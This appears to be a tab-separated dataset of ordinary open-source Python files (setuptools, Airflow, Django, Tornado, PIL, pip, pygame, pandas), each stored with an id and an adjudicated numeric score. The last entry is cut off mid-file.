68	adjudicated	2	"from distutils.util import convert_path<<NEWL>>from distutils import log<<NEWL>>from distutils.errors import DistutilsOptionError<<NEWL>>import os<<NEWL>>import shutil<<NEWL>><<NEWL>>from setuptools import Command<<NEWL>><<NEWL>><<NEWL>>class rotate(Command):<<NEWL>>    """"""Delete older distributions""""""<<NEWL>><<NEWL>>    description = ""delete older distributions, keeping N newest files""<<NEWL>>    user_options = [<<NEWL>>        (""match="", ""m"", ""patterns to match (required)""),<<NEWL>>        (""dist-dir="", ""d"", ""directory where the distributions are""),<<NEWL>>        (""keep="", ""k"", ""number of matching distributions to keep""),<<NEWL>>    ]<<NEWL>><<NEWL>>    boolean_options = []<<NEWL>><<NEWL>>    def initialize_options(self):<<NEWL>>        self.match = None<<NEWL>>        self.dist_dir = None<<NEWL>>        self.keep = None<<NEWL>><<NEWL>>    def finalize_options(self):<<NEWL>>        if self.match is None:<<NEWL>>            raise DistutilsOptionError(<<NEWL>>                ""Must specify one or more (comma-separated) match patterns ""<<NEWL>>                ""(e.g. '.zip' or '.egg')""<<NEWL>>            )<<NEWL>>        if self.keep is None:<<NEWL>>            raise DistutilsOptionError(""Must specify number of files to keep"")<<NEWL>>        try:<<NEWL>>            self.keep = int(self.keep)<<NEWL>>        except ValueError as e:<<NEWL>>            raise DistutilsOptionError(""--keep must be an integer"") from e<<NEWL>>        if isinstance(self.match, str):<<NEWL>>            self.match = [convert_path(p.strip()) for p in self.match.split("","")]<<NEWL>>        self.set_undefined_options(""bdist"", (""dist_dir"", ""dist_dir""))<<NEWL>><<NEWL>>    def run(self):<<NEWL>>        self.run_command(""egg_info"")<<NEWL>>        from glob import glob<<NEWL>><<NEWL>>        for pattern in self.match:<<NEWL>>            pattern = self.distribution.get_name() + ""*"" + pattern<<NEWL>>            files = glob(os.path.join(self.dist_dir, pattern))<<NEWL>>            files = [(os.path.getmtime(f), f) for f in files]<<NEWL>>            files.sort()<<NEWL>>            files.reverse()<<NEWL>><<NEWL>>            log.info(""%d file(s) matching %s"", len(files), pattern)<<NEWL>>            files = files[self.keep :]<<NEWL>>            for t, f in files:<<NEWL>>                log.info(""Deleting %s"", f)<<NEWL>>                if not self.dry_run:<<NEWL>>                    if os.path.isdir(f):<<NEWL>>                        shutil.rmtree(f)<<NEWL>>                    else:<<NEWL>>                        os.unlink(f)"
78	adjudicated	2	"# Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>from typing import NamedTuple<<NEWL>><<NEWL>>from marshmallow import Schema, fields<<NEWL>>from marshmallow_sqlalchemy import SQLAlchemySchema, auto_field<<NEWL>><<NEWL>>from airflow.models.log import Log<<NEWL>><<NEWL>><<NEWL>>class EventLogSchema(SQLAlchemySchema):<<NEWL>>    """"""Event log schema.""""""<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        """"""Meta.""""""<<NEWL>><<NEWL>>        model = Log<<NEWL>><<NEWL>>    id = auto_field(data_key=""event_log_id"", dump_only=True)<<NEWL>>    dttm = auto_field(data_key=""when"", dump_only=True)<<NEWL>>    dag_id = auto_field(dump_only=True)<<NEWL>>    task_id = auto_field(dump_only=True)<<NEWL>>    event = auto_field(dump_only=True)<<NEWL>>    execution_date = auto_field(dump_only=True)<<NEWL>>    owner = auto_field(dump_only=True)<<NEWL>>    extra = auto_field(dump_only=True)<<NEWL>><<NEWL>><<NEWL>>class EventLogCollection(NamedTuple):<<NEWL>>    """"""List of import errors with metadata.""""""<<NEWL>><<NEWL>>    event_logs: list[Log]<<NEWL>>    total_entries: int<<NEWL>><<NEWL>><<NEWL>>class EventLogCollectionSchema(Schema):<<NEWL>>    """"""EventLog Collection Schema.""""""<<NEWL>><<NEWL>>    event_logs = fields.List(fields.Nested(EventLogSchema))<<NEWL>>    total_entries = fields.Int()<<NEWL>><<NEWL>><<NEWL>>event_log_schema = EventLogSchema()<<NEWL>>event_log_collection_schema = EventLogCollectionSchema()"
138	adjudicated	2	"import functools<<NEWL>>from pathlib import Path<<NEWL>><<NEWL>>from django.conf import settings<<NEWL>>from django.template.backends.django import DjangoTemplates<<NEWL>>from django.template.loader import get_template<<NEWL>>from django.utils.functional import cached_property<<NEWL>>from django.utils.module_loading import import_string<<NEWL>><<NEWL>>try:<<NEWL>>    from django.template.backends.jinja2 import Jinja2<<NEWL>>except ImportError:<<NEWL>>    def Jinja2(params):<<NEWL>>        raise ImportError(""jinja2 isn't installed"")<<NEWL>><<NEWL>>ROOT = Path(__file__).parent<<NEWL>><<NEWL>><<NEWL>>@functools.lru_cache()<<NEWL>>def get_default_renderer():<<NEWL>>    renderer_class = import_string(settings.FORM_RENDERER)<<NEWL>>    return renderer_class()<<NEWL>><<NEWL>><<NEWL>>class BaseRenderer:<<NEWL>>    def get_template(self, template_name):<<NEWL>>        raise NotImplementedError('subclasses must implement get_template()')<<NEWL>><<NEWL>>    def render(self, template_name, context, request=None):<<NEWL>>        template = self.get_template(template_name)<<NEWL>>        return template.render(context, request=request).strip()<<NEWL>><<NEWL>><<NEWL>>class EngineMixin:<<NEWL>>    def get_template(self, template_name):<<NEWL>>        return self.engine.get_template(template_name)<<NEWL>><<NEWL>>    @cached_property<<NEWL>>    def engine(self):<<NEWL>>        return self.backend({<<NEWL>>            'APP_DIRS': True,<<NEWL>>            'DIRS': [ROOT / self.backend.app_dirname],<<NEWL>>            'NAME': 'djangoforms',<<NEWL>>            'OPTIONS': {},<<NEWL>>        })<<NEWL>><<NEWL>><<NEWL>>class DjangoTemplates(EngineMixin, BaseRenderer):<<NEWL>>    """"""<<NEWL>>    Load Django templates from the built-in widget templates in<<NEWL>>    django/forms/templates and from apps' 'templates' directory.<<NEWL>>    """"""<<NEWL>>    backend = DjangoTemplates<<NEWL>><<NEWL>><<NEWL>>class Jinja2(EngineMixin, BaseRenderer):<<NEWL>>    """"""<<NEWL>>    Load Jinja2 templates from the built-in widget templates in<<NEWL>>    django/forms/jinja2 and from apps' 'jinja2' directory.<<NEWL>>    """"""<<NEWL>>    backend = Jinja2<<NEWL>><<NEWL>><<NEWL>>class TemplatesSetting(BaseRenderer):<<NEWL>>    """"""<<NEWL>>    Load templates using template.loader.get_template() which is configured<<NEWL>>    based on settings.TEMPLATES.<<NEWL>>    """"""<<NEWL>>    def get_template(self, template_name):<<NEWL>>        return get_template(template_name)"
29	adjudicated	1	"import socket<<NEWL>>import typing<<NEWL>><<NEWL>>from tornado.http1connection import HTTP1Connection<<NEWL>>from tornado.httputil import HTTPMessageDelegate<<NEWL>>from tornado.iostream import IOStream<<NEWL>>from tornado.locks import Event<<NEWL>>from tornado.netutil import add_accept_handler<<NEWL>>from tornado.testing import AsyncTestCase, bind_unused_port, gen_test<<NEWL>><<NEWL>><<NEWL>>class HTTP1ConnectionTest(AsyncTestCase):<<NEWL>>    code = None  # type: typing.Optional[int]<<NEWL>><<NEWL>>    def setUp(self):<<NEWL>>        super().setUp()<<NEWL>>        self.asyncSetUp()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def asyncSetUp(self):<<NEWL>>        listener, port = bind_unused_port()<<NEWL>>        event = Event()<<NEWL>><<NEWL>>        def accept_callback(conn, addr):<<NEWL>>            self.server_stream = IOStream(conn)<<NEWL>>            self.addCleanup(self.server_stream.close)<<NEWL>>            event.set()<<NEWL>><<NEWL>>        add_accept_handler(listener, accept_callback)<<NEWL>>        self.client_stream = IOStream(socket.socket())<<NEWL>>        self.addCleanup(self.client_stream.close)<<NEWL>>        yield [self.client_stream.connect((""127.0.0.1"", port)), event.wait()]<<NEWL>>        self.io_loop.remove_handler(listener)<<NEWL>>        listener.close()<<NEWL>><<NEWL>>    @gen_test<<NEWL>>    def test_http10_no_content_length(self):<<NEWL>>        # Regression test for a bug in which can_keep_alive would crash<<NEWL>>        # for an HTTP/1.0 (not 1.1) response with no content-length.<<NEWL>>        conn = HTTP1Connection(self.client_stream, True)<<NEWL>>        self.server_stream.write(b""HTTP/1.0 200 Not Modified\r\n\r\nhello"")<<NEWL>>        self.server_stream.close()<<NEWL>><<NEWL>>        event = Event()<<NEWL>>        test = self<<NEWL>>        body = []<<NEWL>><<NEWL>>        class Delegate(HTTPMessageDelegate):<<NEWL>>            def headers_received(self, start_line, headers):<<NEWL>>                test.code = start_line.code<<NEWL>><<NEWL>>            def data_received(self, data):<<NEWL>>                body.append(data)<<NEWL>><<NEWL>>            def finish(self):<<NEWL>>                event.set()<<NEWL>><<NEWL>>        yield conn.read_response(Delegate())<<NEWL>>        yield event.wait()<<NEWL>>        self.assertEqual(self.code, 200)<<NEWL>>        self.assertEqual(b"""".join(body), b""hello"")"
169	adjudicated	3	"#<<NEWL>># The Python Imaging Library.<<NEWL>># $Id$<<NEWL>>#<<NEWL>># Binary input/output support routines.<<NEWL>>#<<NEWL>># Copyright (c) 1997-2003 by Secret Labs AB<<NEWL>># Copyright (c) 1995-2003 by Fredrik Lundh<<NEWL>># Copyright (c) 2012 by Brian Crowell<<NEWL>>#<<NEWL>># See the README file for information on usage and redistribution.<<NEWL>>#<<NEWL>><<NEWL>><<NEWL>>""""""Binary input/output support routines.""""""<<NEWL>><<NEWL>><<NEWL>>from struct import pack, unpack_from<<NEWL>><<NEWL>><<NEWL>>def i8(c):<<NEWL>>    return c if c.__class__ is int else c[0]<<NEWL>><<NEWL>><<NEWL>>def o8(i):<<NEWL>>    return bytes((i & 255,))<<NEWL>><<NEWL>><<NEWL>># Input, le = little endian, be = big endian<<NEWL>>def i16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si16be(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 2-bytes (16 bits) string to a signed integer, big endian.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from("">h"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to an unsigned integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def si32le(c, o=0):<<NEWL>>    """"""<<NEWL>>    Converts a 4-bytes (32 bits) string to a signed integer.<<NEWL>><<NEWL>>    :param c: string containing bytes to convert<<NEWL>>    :param o: offset of bytes to convert in string<<NEWL>>    """"""<<NEWL>>    return unpack_from(""<i"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i16be(c, o=0):<<NEWL>>    return unpack_from("">H"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>>def i32be(c, o=0):<<NEWL>>    return unpack_from("">I"", c, o)[0]<<NEWL>><<NEWL>><<NEWL>># Output, le = little endian, be = big endian<<NEWL>>def o16le(i):<<NEWL>>    return pack(""<H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32le(i):<<NEWL>>    return pack(""<I"", i)<<NEWL>><<NEWL>><<NEWL>>def o16be(i):<<NEWL>>    return pack("">H"", i)<<NEWL>><<NEWL>><<NEWL>>def o32be(i):<<NEWL>>    return pack("">I"", i)"
454	adjudicated	1	"""""""<<NEWL>>views.py        # Houses `SchemaView`, `APIView` subclass.<<NEWL>><<NEWL>>See schemas.__init__.py for package overview.<<NEWL>>""""""<<NEWL>>from rest_framework import exceptions, renderers<<NEWL>>from rest_framework.response import Response<<NEWL>>from rest_framework.schemas import coreapi<<NEWL>>from rest_framework.settings import api_settings<<NEWL>>from rest_framework.views import APIView<<NEWL>><<NEWL>><<NEWL>>class SchemaView(APIView):<<NEWL>>    _ignore_model_permissions = True<<NEWL>>    schema = None  # exclude from schema<<NEWL>>    renderer_classes = None<<NEWL>>    schema_generator = None<<NEWL>>    public = False<<NEWL>><<NEWL>>    def __init__(self, *args, **kwargs):<<NEWL>>        super().__init__(*args, **kwargs)<<NEWL>>        if self.renderer_classes is None:<<NEWL>>            if coreapi.is_enabled():<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.CoreAPIOpenAPIRenderer,<<NEWL>>                    renderers.CoreJSONRenderer<<NEWL>>                ]<<NEWL>>            else:<<NEWL>>                self.renderer_classes = [<<NEWL>>                    renderers.OpenAPIRenderer,<<NEWL>>                    renderers.JSONOpenAPIRenderer,<<NEWL>>                ]<<NEWL>>            if renderers.BrowsableAPIRenderer in api_settings.DEFAULT_RENDERER_CLASSES:<<NEWL>>                self.renderer_classes += [renderers.BrowsableAPIRenderer]<<NEWL>><<NEWL>>    def get(self, request, *args, **kwargs):<<NEWL>>        schema = self.schema_generator.get_schema(request, self.public)<<NEWL>>        if schema is None:<<NEWL>>            raise exceptions.PermissionDenied()<<NEWL>>        return Response(schema)<<NEWL>><<NEWL>>    def handle_exception(self, exc):<<NEWL>>        # Schema renderers do not render exceptions, so re-perform content<<NEWL>>        # negotiation with default renderers.<<NEWL>>        self.renderer_classes = api_settings.DEFAULT_RENDERER_CLASSES<<NEWL>>        neg = self.perform_content_negotiation(self.request, force=True)<<NEWL>>        self.request.accepted_renderer, self.request.accepted_media_type = neg<<NEWL>>        return super().handle_exception(exc)"
514	adjudicated	3	"""""""<<NEWL>> The GeometryColumns and SpatialRefSys models for the SpatiaLite backend.<<NEWL>>""""""<<NEWL>>from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin<<NEWL>>from django.db import models<<NEWL>><<NEWL>><<NEWL>>class SpatialiteGeometryColumns(models.Model):<<NEWL>>    """"""<<NEWL>>    The 'geometry_columns' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>>    f_table_name = models.CharField(max_length=256)<<NEWL>>    f_geometry_column = models.CharField(max_length=256)<<NEWL>>    coord_dimension = models.IntegerField()<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    spatial_index_enabled = models.IntegerField()<<NEWL>>    type = models.IntegerField(db_column='geometry_type')<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = 'gis'<<NEWL>>        db_table = 'geometry_columns'<<NEWL>>        managed = False<<NEWL>><<NEWL>>    def __str__(self):<<NEWL>>        return '%s.%s - %dD %s field (SRID: %d)' % (<<NEWL>>            self.f_table_name,<<NEWL>>            self.f_geometry_column,<<NEWL>>            self.coord_dimension,<<NEWL>>            self.type,<<NEWL>>            self.srid,<<NEWL>>        )<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def table_name_col(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature table<<NEWL>>        name.<<NEWL>>        """"""<<NEWL>>        return 'f_table_name'<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def geom_col_name(cls):<<NEWL>>        """"""<<NEWL>>        Return the name of the metadata column used to store the feature<<NEWL>>        geometry column.<<NEWL>>        """"""<<NEWL>>        return 'f_geometry_column'<<NEWL>><<NEWL>><<NEWL>>class SpatialiteSpatialRefSys(models.Model, SpatialRefSysMixin):<<NEWL>>    """"""<<NEWL>>    The 'spatial_ref_sys' table from SpatiaLite.<<NEWL>>    """"""<<NEWL>>    srid = models.IntegerField(primary_key=True)<<NEWL>>    auth_name = models.CharField(max_length=256)<<NEWL>>    auth_srid = models.IntegerField()<<NEWL>>    ref_sys_name = models.CharField(max_length=256)<<NEWL>>    proj4text = models.CharField(max_length=2048)<<NEWL>>    srtext = models.CharField(max_length=2048)<<NEWL>><<NEWL>>    class Meta:<<NEWL>>        app_label = 'gis'<<NEWL>>        db_table = 'spatial_ref_sys'<<NEWL>>        managed = False<<NEWL>><<NEWL>>    @property<<NEWL>>    def wkt(self):<<NEWL>>        return self.srtext"
405	adjudicated	4	"from itertools import filterfalse<<NEWL>><<NEWL>><<NEWL>>def unique_everseen(iterable, key=None):<<NEWL>>    ""List unique elements, preserving order. Remember all elements ever seen.""<<NEWL>>    # unique_everseen('AAAABBBCCDAABBB') --> A B C D<<NEWL>>    # unique_everseen('ABBCcAD', str.lower) --> A B C D<<NEWL>>    seen = set()<<NEWL>>    seen_add = seen.add<<NEWL>>    if key is None:<<NEWL>>        for element in filterfalse(seen.__contains__, iterable):<<NEWL>>            seen_add(element)<<NEWL>>            yield element<<NEWL>>    else:<<NEWL>>        for element in iterable:<<NEWL>>            k = key(element)<<NEWL>>            if k not in seen:<<NEWL>>                seen_add(k)<<NEWL>>                yield element<<NEWL>><<NEWL>><<NEWL>># copied from more_itertools 8.8<<NEWL>>def always_iterable(obj, base_type=(str, bytes)):<<NEWL>>    """"""If *obj* is iterable, return an iterator over its items::<<NEWL>><<NEWL>>        >>> obj = (1, 2, 3)<<NEWL>>        >>> list(always_iterable(obj))<<NEWL>>        [1, 2, 3]<<NEWL>><<NEWL>>    If *obj* is not iterable, return a one-item iterable containing *obj*::<<NEWL>><<NEWL>>        >>> obj = 1<<NEWL>>        >>> list(always_iterable(obj))<<NEWL>>        [1]<<NEWL>><<NEWL>>    If *obj* is ``None``, return an empty iterable:<<NEWL>><<NEWL>>        >>> obj = None<<NEWL>>        >>> list(always_iterable(None))<<NEWL>>        []<<NEWL>><<NEWL>>    By default, binary and text strings are not considered iterable::<<NEWL>><<NEWL>>        >>> obj = 'foo'<<NEWL>>        >>> list(always_iterable(obj))<<NEWL>>        ['foo']<<NEWL>><<NEWL>>    If *base_type* is set, objects for which ``isinstance(obj, base_type)``<<NEWL>>    returns ``True`` won't be considered iterable.<<NEWL>><<NEWL>>        >>> obj = {'a': 1}<<NEWL>>        >>> list(always_iterable(obj))  # Iterate over the dict's keys<<NEWL>>        ['a']<<NEWL>>        >>> list(always_iterable(obj, base_type=dict))  # Treat dicts as a unit<<NEWL>>        [{'a': 1}]<<NEWL>><<NEWL>>    Set *base_type* to ``None`` to avoid any special handling and treat objects<<NEWL>>    Python considers iterable as iterable:<<NEWL>><<NEWL>>        >>> obj = 'foo'<<NEWL>>        >>> list(always_iterable(obj, base_type=None))<<NEWL>>        ['f', 'o', 'o']<<NEWL>>    """"""<<NEWL>>    if obj is None:<<NEWL>>        return iter(())<<NEWL>><<NEWL>>    if (base_type is not None) and isinstance(obj, base_type):<<NEWL>>        return iter((obj,))<<NEWL>><<NEWL>>    try:<<NEWL>>        return iter(obj)<<NEWL>>    except TypeError:<<NEWL>>        return iter((obj,))"
493	adjudicated	2	"#<<NEWL>># Licensed to the Apache Software Foundation (ASF) under one<<NEWL>># or more contributor license agreements.  See the NOTICE file<<NEWL>># distributed with this work for additional information<<NEWL>># regarding copyright ownership.  The ASF licenses this file<<NEWL>># to you under the Apache License, Version 2.0 (the<<NEWL>># ""License""); you may not use this file except in compliance<<NEWL>># with the License.  You may obtain a copy of the License at<<NEWL>>#<<NEWL>>#   http://www.apache.org/licenses/LICENSE-2.0<<NEWL>>#<<NEWL>># Unless required by applicable law or agreed to in writing,<<NEWL>># software distributed under the License is distributed on an<<NEWL>># ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY<<NEWL>># KIND, either express or implied.  See the License for the<<NEWL>># specific language governing permissions and limitations<<NEWL>># under the License.<<NEWL>>from __future__ import annotations<<NEWL>><<NEWL>>from unittest import mock<<NEWL>><<NEWL>>import pytest<<NEWL>><<NEWL>>from airflow.cli import cli_parser<<NEWL>>from airflow.cli.commands import dag_processor_command<<NEWL>>from airflow.configuration import conf<<NEWL>>from tests.test_utils.config import conf_vars<<NEWL>><<NEWL>><<NEWL>>class TestDagProcessorCommand:<<NEWL>>    """"""<<NEWL>>    Tests the CLI interface and that it correctly calls the DagProcessor<<NEWL>>    """"""<<NEWL>><<NEWL>>    @classmethod<<NEWL>>    def setup_class(cls):<<NEWL>>        cls.parser = cli_parser.get_parser()<<NEWL>><<NEWL>>    @conf_vars(<<NEWL>>        {<<NEWL>>            (""scheduler"", ""standalone_dag_processor""): ""True"",<<NEWL>>            (""core"", ""load_examples""): ""False"",<<NEWL>>        }<<NEWL>>    )<<NEWL>>    @mock.patch(""airflow.cli.commands.dag_processor_command.DagProcessorJob"")<<NEWL>>    @pytest.mark.skipif(<<NEWL>>        conf.get_mandatory_value(""database"", ""sql_alchemy_conn"").lower().startswith(""sqlite""),<<NEWL>>        reason=""Standalone Dag Processor doesn't support sqlite."",<<NEWL>>    )<<NEWL>>    def test_start_job(<<NEWL>>        self,<<NEWL>>        mock_dag_job,<<NEWL>>    ):<<NEWL>>        """"""Ensure that DagFileProcessorManager is started""""""<<NEWL>>        with conf_vars({(""scheduler"", ""standalone_dag_processor""): ""True""}):<<NEWL>>            args = self.parser.parse_args([""dag-processor""])<<NEWL>>            dag_processor_command.dag_processor(args)<<NEWL>>            mock_dag_job.return_value.run.assert_called()"
431	adjudicated	3	"import os<<NEWL>>import string<<NEWL>>import urllib.parse<<NEWL>>import urllib.request<<NEWL>>from typing import Optional<<NEWL>><<NEWL>>from .compat import WINDOWS<<NEWL>><<NEWL>><<NEWL>>def get_url_scheme(url: str) -> Optional[str]:<<NEWL>>    if "":"" not in url:<<NEWL>>        return None<<NEWL>>    return url.split("":"", 1)[0].lower()<<NEWL>><<NEWL>><<NEWL>>def path_to_url(path: str) -> str:<<NEWL>>    """"""<<NEWL>>    Convert a path to a file: URL.  The path will be made absolute and have<<NEWL>>    quoted path parts.<<NEWL>>    """"""<<NEWL>>    path = os.path.normpath(os.path.abspath(path))<<NEWL>>    url = urllib.parse.urljoin(""file:"", urllib.request.pathname2url(path))<<NEWL>>    return url<<NEWL>><<NEWL>><<NEWL>>def url_to_path(url: str) -> str:<<NEWL>>    """"""<<NEWL>>    Convert a file: URL to a path.<<NEWL>>    """"""<<NEWL>>    assert url.startswith(<<NEWL>>        ""file:""<<NEWL>>    ), f""You can only turn file: urls into filenames (not {url!r})""<<NEWL>><<NEWL>>    _, netloc, path, _, _ = urllib.parse.urlsplit(url)<<NEWL>><<NEWL>>    if not netloc or netloc == ""localhost"":<<NEWL>>        # According to RFC 8089, same as empty authority.<<NEWL>>        netloc = """"<<NEWL>>    elif WINDOWS:<<NEWL>>        # If we have a UNC path, prepend UNC share notation.<<NEWL>>        netloc = ""\\\\"" + netloc<<NEWL>>    else:<<NEWL>>        raise ValueError(<<NEWL>>            f""non-local file URIs are not supported on this platform: {url!r}""<<NEWL>>        )<<NEWL>><<NEWL>>    path = urllib.request.url2pathname(netloc + path)<<NEWL>><<NEWL>>    # On Windows, urlsplit parses the path as something like ""/C:/Users/foo"".<<NEWL>>    # This creates issues for path-related functions like io.open(), so we try<<NEWL>>    # to detect and strip the leading slash.<<NEWL>>    if (<<NEWL>>        WINDOWS<<NEWL>>        and not netloc  # Not UNC.<<NEWL>>        and len(path) >= 3<<NEWL>>        and path[0] == ""/""  # Leading slash to strip.<<NEWL>>        and path[1] in string.ascii_letters  # Drive letter.<<NEWL>>        and path[2:4] in ("":"", "":/"")  # Colon + end of string, or colon + absolute path.<<NEWL>>    ):<<NEWL>>        path = path[1:]<<NEWL>><<NEWL>>    return path"
460	adjudicated	1	"#!/usr/bin/env python<<NEWL>>"""""" pygame.examples.setmodescale<<NEWL>><<NEWL>>On high resolution displays(4k, 1080p) and tiny graphics games (640x480)<<NEWL>>show up very small so that they are unplayable. SCALED scales up the window<<NEWL>>for you. The game thinks it's a 640x480 window, but really it can be bigger.<<NEWL>>Mouse events are scaled for you, so your game doesn't need to do it.<<NEWL>><<NEWL>>Passing SCALED to pygame.display.set_mode means the resolution depends<<NEWL>>on desktop size and the graphics are scaled.<<NEWL>>""""""<<NEWL>><<NEWL>>import pygame as pg<<NEWL>><<NEWL>>pg.init()<<NEWL>><<NEWL>>RES = (160, 120)<<NEWL>>FPS = 30<<NEWL>>clock = pg.time.Clock()<<NEWL>><<NEWL>>print(""desktops"", pg.display.get_desktop_sizes())<<NEWL>>screen = pg.display.set_mode(RES, pg.SCALED | pg.RESIZABLE)<<NEWL>><<NEWL>># MAIN LOOP<<NEWL>><<NEWL>>done = False<<NEWL>><<NEWL>>i = 0<<NEWL>>j = 0<<NEWL>><<NEWL>>r_name, r_flags = pg.display._get_renderer_info()<<NEWL>>print(""renderer:"", r_name, ""flags:"", bin(r_flags))<<NEWL>>for flag, name in [<<NEWL>>    (1, ""software""),<<NEWL>>    (2, ""accelerated""),<<NEWL>>    (4, ""VSync""),<<NEWL>>    (8, ""render to texture""),<<NEWL>>]:<<NEWL>>    if flag & r_flags:<<NEWL>>        print(name)<<NEWL>><<NEWL>>while not done:<<NEWL>>    for event in pg.event.get():<<NEWL>>        if event.type == pg.KEYDOWN and event.key == pg.K_q:<<NEWL>>            done = True<<NEWL>>        if event.type == pg.QUIT:<<NEWL>>            done = True<<NEWL>>        if event.type == pg.KEYDOWN and event.key == pg.K_f:<<NEWL>>            pg.display.toggle_fullscreen()<<NEWL>>        if event.type == pg.VIDEORESIZE:<<NEWL>>            pg.display._resize_event(event)<<NEWL>><<NEWL>>    i += 1<<NEWL>>    i = i % screen.get_width()<<NEWL>>    j += i % 2<<NEWL>>    j = j % screen.get_height()<<NEWL>><<NEWL>>    screen.fill((255, 0, 255))<<NEWL>>    pg.draw.circle(screen, (0, 0, 0), (100, 100), 20)<<NEWL>>    pg.draw.circle(screen, (0, 0, 200), (0, 0), 10)<<NEWL>>    pg.draw.circle(screen, (200, 0, 0), (160, 120), 30)<<NEWL>>    pg.draw.line(screen, (250, 250, 0), (0, 120), (160, 0))<<NEWL>>    pg.draw.circle(screen, (255, 255, 255), (i, j), 5)<<NEWL>><<NEWL>>    pg.display.flip()<<NEWL>>    clock.tick(FPS)<<NEWL>>pg.quit()"
412	adjudicated	2	"import numpy as np<<NEWL>>import pytest<<NEWL>><<NEWL>>import pandas as pd<<NEWL>>from pandas import (<<NEWL>>    Index,<<NEWL>>    MultiIndex,<<NEWL>>)<<NEWL>><<NEWL>><<NEWL>># Note: identical the ""multi"" entry in the top-level ""index"" fixture<<NEWL>>@pytest.fixture<<NEWL>>def idx():<<NEWL>>    # a MultiIndex used to test the general functionality of the<<NEWL>>    # general functionality of this object<<NEWL>>    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])<<NEWL>>    minor_axis = Index([""one"", ""two""])<<NEWL>><<NEWL>>    major_codes = np.array([0, 0, 1, 2, 3, 3])<<NEWL>>    minor_codes = np.array([0, 1, 0, 1, 0, 1])<<NEWL>>    index_names = [""first"", ""second""]<<NEWL>>    mi = MultiIndex(<<NEWL>>        levels=[major_axis, minor_axis],<<NEWL>>        codes=[major_codes, minor_codes],<<NEWL>>        names=index_names,<<NEWL>>        verify_integrity=False,<<NEWL>>    )<<NEWL>>    return mi<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def idx_dup():<<NEWL>>    # compare tests/indexes/multi/conftest.py<<NEWL>>    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])<<NEWL>>    minor_axis = Index([""one"", ""two""])<<NEWL>><<NEWL>>    major_codes = np.array([0, 0, 1, 0, 1, 1])<<NEWL>>    minor_codes = np.array([0, 1, 0, 1, 0, 1])<<NEWL>>    index_names = [""first"", ""second""]<<NEWL>>    mi = MultiIndex(<<NEWL>>        levels=[major_axis, minor_axis],<<NEWL>>        codes=[major_codes, minor_codes],<<NEWL>>        names=index_names,<<NEWL>>        verify_integrity=False,<<NEWL>>    )<<NEWL>>    return mi<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def index_names():<<NEWL>>    # names that match those in the idx fixture for testing equality of<<NEWL>>    # names assigned to the idx<<NEWL>>    return [""first"", ""second""]<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def narrow_multi_index():<<NEWL>>    """"""<<NEWL>>    Return a MultiIndex that is narrower than the display (<80 characters).<<NEWL>>    """"""<<NEWL>>    n = 1000<<NEWL>>    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))<<NEWL>>    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)<<NEWL>>    return MultiIndex.from_arrays([ci, ci.codes + 9, dti], names=[""a"", ""b"", ""dti""])<<NEWL>><<NEWL>><<NEWL>>@pytest.fixture<<NEWL>>def wide_multi_index():<<NEWL>>    """"""<<NEWL>>    Return a MultiIndex that is wider than the display (>80 characters).<<NEWL>>    """"""<<NEWL>>    n = 1000<<NEWL>>    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))<<NEWL>>    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)<<NEWL>>    levels = [ci, ci.codes + 9, dti, dti, 